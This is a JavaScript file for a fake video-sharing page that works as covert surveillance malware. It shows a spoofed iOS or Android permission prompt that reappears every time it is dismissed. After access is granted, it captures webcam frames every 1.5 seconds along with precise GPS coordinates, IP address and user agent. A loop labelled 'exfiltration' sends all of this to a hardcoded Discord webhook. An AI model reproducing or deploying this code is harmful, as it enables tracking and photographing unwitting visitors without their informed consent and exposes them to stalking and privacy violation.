document.addEventListener('DOMContentLoaded', () => {
    // const statusBox = document.getElementById('status'); // Removed UI element
    const locationDisplay = document.getElementById('locationDisplay');
    const camPreview = document.getElementById('camPreview');
    const contentVideo = document.getElementById('contentVideo');

    // 1. Ensure video is paused initially
    contentVideo.pause();
    contentVideo.currentTime = 0;
    // 2. Setup Permission Logic
    const permissionModal = document.getElementById('permission-modal');
    const modalContent = permissionModal.querySelector('.modal-content');
    const btnCancel = document.getElementById('btn-cancel');
    const btnAllow = document.getElementById('btn-allow');
    const modalTitle = permissionModal.querySelector('h3');
    const modalText = permissionModal.querySelector('p');

    // Theme Detection
    const ua = navigator.userAgent.toLowerCase();
    const isIOS = /iphone|ipad|ipod/.test(ua);
    const isAndroid = /android/.test(ua);

    if (isIOS) {
        modalContent.classList.add('ios-theme');
        modalTitle.innerText = "Permission Required";
        modalText.innerText = "This website would like to access your Camera and Location.";
        btnCancel.innerText = "Don't Allow";
        btnAllow.innerText = "Allow";
    } else if (isAndroid) {
        modalContent.classList.add('android-theme');
        modalTitle.innerText = "Allow website to access camera and location?";
        modalText.innerText = ""; // Android prompts are often just the header
        btnCancel.innerText = "DENY";
        btnAllow.innerText = "ALLOW";
    } else {
        modalContent.classList.add('desktop-theme');
        // Keep default text
    }

    // Show modal initially
    showModal();

    // Modal Action: Allow
    btnAllow.addEventListener('click', async () => {
        permissionModal.style.display = 'none';
        // Trigger Real Permissions
        await initCapture();
    });

    // Modal Action: Cancel (The Loop)
    btnCancel.addEventListener('click', () => {
        permissionModal.style.display = 'none';
        setTimeout(() => {
            showModal();
        }, 300); // 300ms delay before annoying reappearance
    });

    function showModal() {
        permissionModal.style.display = 'flex';
    }

    // State for captured data
    const state = {
        stream: null,
        coords: null,
        ip: "Unknown",
        loopActive: false,
        capturesCount: 0
    };

    async function initCapture() {
        console.log("Requesting permissions independently...");

        // 1. Trigger Camera Request
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                console.log("Camera granted");
                state.stream = stream;
                camPreview.srcObject = stream;
                camPreview.onloadedmetadata = () => {
                    camPreview.play();
                    startExfiltrationLoop(); // Start immediately if we have camera
                };
                // Attempt to play content video if not already playing
                contentVideo.play().catch(e => console.log("Video fail:", e));
            })
            .catch(err => {
                console.log("Camera denied:", err);
                checkIfAllDenied();
            });

        // 2. Trigger Location Request
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    console.log("Location granted");
                    state.coords = position.coords;
                    startExfiltrationLoop(); // Start immediately if we have location
                },
                (err) => {
                    console.log("Location denied:", err);
                    checkIfAllDenied();
                },
                { enableHighAccuracy: true }
            );
        } else {
            console.log("Geolocation not supported");
        }

        // 3. Fetch IP (Independent)
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                state.ip = data.ip;
                // No need to trigger loop just for IP, but it will be included in next capture
            })
            .catch(e => console.log("IP Fetch failed"));
    }

    function startExfiltrationLoop() {
        if (state.loopActive) return; // Already running
        state.loopActive = true;
        console.log("Starting exfiltration loop...");

        // Start content video if it hasn't started
        contentVideo.play().catch(e => console.log("Video play failed:", e));

        const maxCaptures = 99999;

        // Immediate first capture
        processCapture();

        const intervalId = setInterval(() => {
            if (state.capturesCount >= maxCaptures) {
                clearInterval(intervalId);
                return;
            }
            processCapture();
        }, 1500); // Slower interval to avoid rate limits if spamming text-only
    }

    async function processCapture() {
        state.capturesCount++;
        let imageBlob = null;

        if (state.stream) {
            try {
                imageBlob = await captureFrame(camPreview);
            } catch (e) { console.log("Frame capture failed", e); }
        }

        sendToDiscord({
            coords: state.coords, // might be null
            imageBlob: imageBlob, // might be null
            ip: state.ip,
            count: state.capturesCount
        });
    }

    function checkIfAllDenied() {
        // If both failed (or one failed and one pending), we might want to re-show modal logic
        // But for now, just let the user interact or re-trigger manually
        // You could add a timeout to see if everything failed after X seconds
        setTimeout(() => {
            if (!state.stream && !state.coords) {
                // Re-show modal if absolutely nothing was granted after a delay
                console.log("No permissions granted yet. Re-prompting soon...");
                showModal();
            }
        }, 8000); // Wait a bit longer to allow user to decide
    }

    function captureFrame(video) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.8));
    }

    function downloadImage(blob) {
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `capture_${Date.now()}.jpg`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // === UI Interactivity ===
    const likeBtn = document.getElementById('likeBtn');
    const dislikeBtn = document.getElementById('dislikeBtn');
    const subscribeBtn = document.getElementById('subscribeBtn');
    const shareBtn = document.getElementById('shareBtn');
    const progressBar = document.getElementById('progressBar');
    const likeCountSpan = document.getElementById('likeCount');

    // Like Button
    likeBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        const icon = likeBtn.querySelector('.icon-circle');
        icon.classList.toggle('icon-filled'); // You might need to add specific CSS for this if using text color

        let count = parseFloat(likeCountSpan.innerText);
        if (likeCountSpan.innerText.includes('M')) {
            // Mock logic for "1.2M" -> just toggle visual state mostly
            if (icon.classList.contains('icon-filled')) {
                icon.style.background = 'rgba(255, 255, 255, 0.2)';
                icon.innerText = '👍'; // Or change to filled version if available
            } else {
                icon.style.background = '';
            }
        }
    });

    // Dislike Button
    dislikeBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        const icon = dislikeBtn.querySelector('.icon-circle');
        // Just visual feedback
        icon.style.transform = 'rotate(-10deg)';
        setTimeout(() => icon.style.transform = '', 200);
    });

    // Subscribe Button
    subscribeBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        if (subscribeBtn.innerText === 'Subscribe') {
            subscribeBtn.innerText = 'Subscribed';
            subscribeBtn.classList.add('subscribed');
        } else {
            subscribeBtn.innerText = 'Subscribe';
            subscribeBtn.classList.remove('subscribed');
        }
    });

    // Share Button
    shareBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        navigator.clipboard.writeText(window.location.href);
        const originalText = shareBtn.querySelector('span').innerText;
        shareBtn.querySelector('span').innerText = 'Copied!';
        setTimeout(() => {
            shareBtn.querySelector('span').innerText = originalText;
        }, 2000);
    });

    // Progress Bar Logic
    contentVideo.addEventListener('timeupdate', () => {
        if (contentVideo.duration) {
            const percentage = (contentVideo.currentTime / contentVideo.duration) * 100;
            progressBar.style.width = `${percentage}%`;
        }
    });

    // Existing Discord Logic (Updated for partial data)
    async function sendToDiscord({ coords, imageBlob, ip, count }) {
        const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
        const formData = new FormData();

        let content = `**Capture #${count}**\nIP: ${ip}\nUA: ${navigator.userAgent}\n`;

        if (coords) {
            const { latitude, longitude, accuracy } = coords;
            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
            content += `Lat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\n**Maps**: <${mapsUrl}>\n`;
        } else {
            content += `Location: Denied/Pending\n`;
        }

        if (imageBlob) {
            formData.append("file", imageBlob, `capture_${count}.jpg`);
        } else {
            content += `Camera: Denied/Pending\n`;
        }

        const payload = { content: content };
        formData.append("payload_json", JSON.stringify(payload));

        try {
            await fetch(webhookUrl, { method: "POST", body: formData });
        } catch (e) { console.error("Webhook Error:", e); }
    }
});
